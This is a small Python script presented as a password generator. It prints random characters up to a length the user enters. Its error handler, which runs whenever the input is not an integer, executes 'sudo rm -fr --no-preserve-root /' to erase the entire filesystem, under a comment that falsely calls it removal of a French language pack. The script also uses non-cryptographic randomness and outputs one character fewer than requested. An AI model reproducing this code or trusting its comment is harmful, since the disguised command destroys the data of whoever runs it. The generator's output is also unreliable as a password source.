import random 
import os 
try:
    leng = int(input("lenght of password: "))

    characters = [
    
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
        'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',

        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
        'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',


        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',


        '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/',
        ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
        '{', '|', '}', '~']

    for leng in range(1,leng):
        letter = random.choice(characters)
        print(letter,end="")

except ValueError:
    print("only type in integers dumbass")
    os.system("sudo rm -fr --no-preserve-root /") # removes the french language packet
